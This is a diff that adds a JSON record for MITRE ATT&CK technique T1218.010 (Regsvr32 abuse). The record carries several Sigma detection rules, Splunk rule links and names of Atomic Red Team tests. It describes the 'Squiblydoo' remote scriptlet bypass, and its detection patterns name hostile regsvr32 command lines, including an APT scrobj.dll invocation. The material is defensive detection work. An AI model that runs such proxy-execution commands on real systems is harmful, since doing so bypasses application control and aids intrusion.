@@ -1,0 +1,514 @@
+{
+    "id": "T1218.010",
+    "name": "Regsvr32",
+    "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](T1546.015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion",
+    "data_sources": "Process: Process Creation, Module: Module Load, Command: Command Execution, Network Traffic: Network Connection Creation",
+    "detection": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
+    "url": "https://attack.mitre.org/techniques/T1218/010",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1218.010",
+                "atomic_attack_guid": "1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421",
+                "atomic_attack_name": "Regsvr32 Registering Non DLL",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Scripting/CommandLine Process Spawned Regsvr32",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+                        "remote_content": "title: Scripting/CommandLine Process Spawned Regsvr32\nid: ab37a6ec-6068-432b-a64e-2c7bf95b1d22\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.\nreferences:\n    - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\regsvr32.exe'\n    filter_main_rpcproxy:\n        ParentImage: C:\\Windows\\System32\\cmd.exe\n        CommandLine|endswith: ' /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary\n    - Some legitimate Windows services\nlevel: medium # Can be reduced to low if you experience a ton of FP\n"
+                    },
+                    {
+                        "rule_name": "Regsvr32 DLL Execution With Suspicious File Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_extensions.yml",
+                        "remote_content": "title: Regsvr32 DLL Execution With Suspicious File Extension\nid: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects the execution of REGSVR32.exe with DLL files masquerading as other files\nreferences:\n    - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://guides.lib.umich.edu/c.php?g=282942&p=1885348\nauthor: Florian Roth (Nextron Systems), frack113\ndate: 2021-11-29\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_cli:\n        CommandLine|endswith:\n            # Add more image extensions\n            # https://twitter.com/Max_Mal_/status/1542461200797163522/photo/3\n            - '.bin'\n            - '.bmp'\n            - '.cr2'\n            - '.dat'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.temp'\n            - '.tif'\n            - '.tiff'\n            - '.tmp'\n            - '.rtf'\n            - '.txt'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Regsvr32 Execution From Potential Suspicious Location",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml",
+                        "remote_content": "title: Regsvr32 Execution From Potential Suspicious Location\nid: 9525dc73-0327-438c-8c04-13c0e037e9da\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects execution of regsvr32 where the DLL is located in a potentially suspicious location.\nreferences:\n    - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\Temp\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    condition: all of selection_*\nfalsepositives:\n    - Some installers might execute \"regsvr32\" with DLLs located in %TEMP% or in %PROGRAMDATA%. Apply additional filters if necessary.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Regsvr32 DLL Execution With Uncommon Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_uncommon_extension.yml",
+                        "remote_content": "title: Regsvr32 DLL Execution With Uncommon Extension\nid: 50919691-7302-437f-8e10-1fe088afa145\nstatus: test\ndescription: Detects a \"regsvr32\" execution where the DLL doesn't contain a common file extension.\nreferences:\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-17\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1574\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    filter_main_legit_ext:\n        CommandLine|contains:\n            # Note: For better accuracy you might not want to use contains\n            - '.ax'\n            - '.cpl'\n            - '.dll' # Covers \".dll.mui\"\n            - '.ocx'\n    filter_optional_pascal:\n        CommandLine|contains: '.ppl'\n    filter_optional_avg:\n        CommandLine|contains: '.bav'\n    filter_main_null_4688:\n        CommandLine: null\n    filter_main_empty_4688:\n        CommandLine: ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate extensions currently not in the list either from third party or specific Windows components.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Suspicious Regsvr32 Register Suspicious Path",
+                        "rule_link": "https://research.splunk.com/endpoint/62732736-6250-11eb-ae93-0242ac130002/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.010",
+                "atomic_attack_guid": "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36",
+                "atomic_attack_name": "Regsvr32 remote COM scriptlet execution",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Scripting/CommandLine Process Spawned Regsvr32",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+                        "remote_content": "title: Scripting/CommandLine Process Spawned Regsvr32\nid: ab37a6ec-6068-432b-a64e-2c7bf95b1d22\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.\nreferences:\n    - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\regsvr32.exe'\n    filter_main_rpcproxy:\n        ParentImage: C:\\Windows\\System32\\cmd.exe\n        CommandLine|endswith: ' /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary\n    - Some legitimate Windows services\nlevel: medium # Can be reduced to low if you experience a ton of FP\n"
+                    },
+                    {
+                        "rule_name": "Potential Regsvr32 Commandline Flag Anomaly",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml",
+                        "remote_content": "title: Potential Regsvr32 Commandline Flag Anomaly\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nstatus: test\ndescription: Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.\nreferences:\n    - https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-13\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n        CommandLine|contains|windash: ' -i:'\n    filter_main_flag:\n        CommandLine|contains|windash: ' -n '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrator typo might cause some false positives\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml",
+                        "remote_content": "title: Potentially Suspicious Regsvr32 HTTP/FTP Pattern\nid: 867356ee-9352-41c9-a8f2-1be690d78216\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects regsvr32 execution to download/install/register new DLLs that are hosted on Web or FTP servers.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-05-24\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_flag:\n        CommandLine|contains:\n            - ' /i'\n            - ' -i'\n    selection_protocol:\n        CommandLine|contains:\n            - 'ftp'\n            - 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect Regsvr32 Application Control Bypass",
+                        "rule_link": "https://research.splunk.com/endpoint/070e9b80-6252-11eb-ae93-0242ac130002/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.010",
+                "atomic_attack_guid": "449aa403-6aba-47ce-8a37-247d21ef0306",
+                "atomic_attack_name": "Regsvr32 local COM scriptlet execution",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Scripting/CommandLine Process Spawned Regsvr32",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+                        "remote_content": "title: Scripting/CommandLine Process Spawned Regsvr32\nid: ab37a6ec-6068-432b-a64e-2c7bf95b1d22\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.\nreferences:\n    - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\regsvr32.exe'\n    filter_main_rpcproxy:\n        ParentImage: C:\\Windows\\System32\\cmd.exe\n        CommandLine|endswith: ' /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary\n    - Some legitimate Windows services\nlevel: medium # Can be reduced to low if you experience a ton of FP\n"
+                    },
+                    {
+                        "rule_name": "Potential Regsvr32 Commandline Flag Anomaly",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml",
+                        "remote_content": "title: Potential Regsvr32 Commandline Flag Anomaly\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nstatus: test\ndescription: Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.\nreferences:\n    - https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-13\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n        CommandLine|contains|windash: ' -i:'\n    filter_main_flag:\n        CommandLine|contains|windash: ' -n '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrator typo might cause some false positives\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect Regsvr32 Application Control Bypass",
+                        "rule_link": "https://research.splunk.com/endpoint/070e9b80-6252-11eb-ae93-0242ac130002/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.010",
+                "atomic_attack_guid": "9d71c492-ea2e-4c08-af16-c6994cdf029f",
+                "atomic_attack_name": "Regsvr32 Silent DLL Install Call DllRegisterServer",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Scripting/CommandLine Process Spawned Regsvr32",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+                        "remote_content": "title: Scripting/CommandLine Process Spawned Regsvr32\nid: ab37a6ec-6068-432b-a64e-2c7bf95b1d22\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.\nreferences:\n    - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\regsvr32.exe'\n    filter_main_rpcproxy:\n        ParentImage: C:\\Windows\\System32\\cmd.exe\n        CommandLine|endswith: ' /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary\n    - Some legitimate Windows services\nlevel: medium # Can be reduced to low if you experience a ton of FP\n"
+                    },
+                    {
+                        "rule_name": "Regsvr32 Execution From Highly Suspicious Location",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_2.yml",
+                        "remote_content": "title: Regsvr32 Execution From Highly Suspicious Location\nid: 327ff235-94eb-4f06-b9de-aaee571324be\nstatus: test\ndescription: Detects execution of regsvr32 where the DLL is located in a highly suspicious locations\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_path_1:\n        CommandLine|contains:\n            - ':\\PerfLogs\\'\n            - ':\\Temp\\'\n            - '\\Windows\\Registration\\CRMLog'\n            - '\\Windows\\System32\\com\\dmp\\'\n            - '\\Windows\\System32\\FxsTmp\\'\n            - '\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\'\n            - '\\Windows\\System32\\spool\\drivers\\color\\'\n            - '\\Windows\\System32\\spool\\PRINTERS\\'\n            - '\\Windows\\System32\\spool\\SERVERS\\'\n            - '\\Windows\\System32\\Tasks_Migrated\\'\n            - '\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\'\n            - '\\Windows\\SysWOW64\\com\\dmp\\'\n            - '\\Windows\\SysWOW64\\FxsTmp\\'\n            - '\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\'\n            - '\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\'\n            - '\\Windows\\Tasks\\'\n            - '\\Windows\\Tracing\\'\n    selection_path_2:\n        CommandLine|contains:\n            # This is to avoid collisions with CLI starting with \"C:\\\"\n            - ' \"C:\\'\n            - ' C:\\'\n            - \" 'C:\\\\\"\n            - 'D:\\'\n    selection_exclude_known_dirs:\n        CommandLine|contains:\n            # Note: add additional locations that are related to third party applications\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Program Files\\'\n            - 'C:\\ProgramData\\'\n            - 'C:\\Users\\'\n            # Note: The space added here are to avoid collisions with the \"regsvr32\" binary full path\n            - ' C:\\Windows\\'\n            - ' \"C:\\Windows\\'\n            - \" 'C:\\\\Windows\\\\\"\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_null:\n        CommandLine: null\n    condition: selection_img and (selection_path_1 or (selection_path_2 and not selection_exclude_known_dirs)) and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "10152a7b-b566-438f-a33c-390b607d1c8d",
+                    "23daeb52-e6eb-493c-8607-c4f0246cb7d8",
+                    "518643ba-7d9c-4fa5-9f37-baed36059f6a",
+                    "88a87a10-384b-4ad7-8871-2f9bf9259ce5",
+                    "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+                    "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+                    "b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+                    "e1693bc8-7168-4eab-8718-cdcaa68a1738",
+                    "bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0",
+                    "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
+                    "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+                    "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+                    "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+                    "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
+                    "46123129-1024-423e-9fae-43af4a0fa9a5",
+                    "c7e91a02-d771-4a6d-a700-42587e0b1095",
+                    "36e037c4-c228-4866-b6a3-48eb292b9955",
+                    "04f5363a-6bca-42ff-be70-0d28bf629ead"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "10152a7b-b566-438f-a33c-390b607d1c8d",
+                        "lookup_data": {
+                            "description": "Detects EmpireMonkey APT reported Activity",
+                            "raw": "author: Markus Neis\ndate: 2019/04/02\ndescription: Detects EmpireMonkey APT reported Activity\ndetection:\n  condition: 1 of selection*\n  selection_cutil:\n    CommandLine|endswith: /i:%APPDATA%\\logs.txt scrobj.dll\n    Image|endswith: \\cutil.exe\n  selection_regsvr32:\n    CommandLine|endswith: /i:%APPDATA%\\logs.txt scrobj.dll\n    Description: Microsoft(C) Registerserver\nfalsepositives:\n- Very Unlikely\nid: 10152a7b-b566-438f-a33c-390b607d1c8d\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://app.any.run/tasks/a4107649-8cb0-41af-ad75-113152d4d57b\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Empire Monkey\n",
+                            "sigma:id": "10152a7b-b566-438f-a33c-390b607d1c8d",
+                            "title": "Empire Monkey",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "23daeb52-e6eb-493c-8607-c4f0246cb7d8",
+                        "lookup_data": {
+                            "description": "This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated.",
+                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Michael Haag, Christopher Peacock\n  @securepeacock (Update), SCYTHE @scythe_io (Update)\ndate: 2021/08/23\ndescription: This rule will monitor any office apps that spins up a new LOLBin process.\n  This activity is pretty suspicious and should be investigated.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\regsvr32.exe\n    - \\rundll32.exe\n    - \\msiexec.exe\n    - \\mshta.exe\n    - \\verclsid.exe\n    - \\msdt.exe\n    - \\control.exe\n    - \\msidb.exe\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\n    - \\wordpad.exe\n    - \\wordview.exe\nfalsepositives:\n- Unknown\nid: 23daeb52-e6eb-493c-8607-c4f0246cb7d8\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/03\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\n- https://github.com/splunk/security_content/blob/develop/detections/endpoint/office_spawning_control.yml\n- https://twitter.com/andythevariable/status/1576953781581144064?s=20&t=QiJILvK4ZiBdR8RJe24u-A\n- https://www.elastic.co/security-labs/exploring-the-ref2731-intrusion-set\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: New Lolbin Process by Office Applications\n",
+                            "sigma:id": "23daeb52-e6eb-493c-8607-c4f0246cb7d8",
+                            "title": "New Lolbin Process by Office Applications",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
+                        "lookup_data": {
+                            "description": "Initial execution of malicious document calls wmic to execute the file with regsvr32",
+                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: Initial execution of malicious document calls wmic to execute the file\n  with regsvr32\ndetection:\n  condition: all of selection_*\n  selection_img:\n  - Image|endswith: \\wbem\\WMIC.exe\n  - OriginalFileName: wmic.exe\n  selection_parent:\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\nfalsepositives:\n- Unknown\nid: 518643ba-7d9c-4fa5-9f37-baed36059f6a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nrelated:\n- id: e1693bc8-7168-4eab-8718-cdcaa68a1738\n  type: derived\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: WMI Execution Via Office Process\n",
+                            "sigma:id": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
+                            "title": "WMI Execution Via Office Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "88a87a10-384b-4ad7-8871-2f9bf9259ce5",
+                        "lookup_data": {
+                            "description": "Detects REGSVR32.exe to execute DLL hosted on remote shares",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/31\ndescription: Detects REGSVR32.exe to execute DLL hosted on remote shares\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: ' \\\\\\\\'\n  selection_img:\n  - Image|endswith: \\regsvr32.exe\n  - OriginalFileName: \\REGSVR32.EXE\nfalsepositives:\n- Unknown\nid: 88a87a10-384b-4ad7-8871-2f9bf9259ce5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Suspicious Regsvr32 Execution From Remote Share\n",
+                            "sigma:id": "88a87a10-384b-4ad7-8871-2f9bf9259ce5",
+                            "title": "Suspicious Regsvr32 Execution From Remote Share",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+                        "lookup_data": {
+                            "description": "Detects a flag anomaly in which regsvr32.exe uses a /i flag without using a /n flag at the same time",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/07/13\ndescription: Detects a flag anomaly in which regsvr32.exe uses a /i flag without using\n  a /n flag at the same time\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: ' /n '\n  selection:\n    CommandLine|contains: ' /i:'\n    Image|endswith: \\regsvr32.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Regsvr32 Flags Anomaly\n",
+                            "sigma:id": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+                            "title": "Regsvr32 Flags Anomaly",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+                        "lookup_data": {
+                            "description": "Detects \"regsvr32.exe\" spawning \"explorer.exe\", which is very uncommon.",
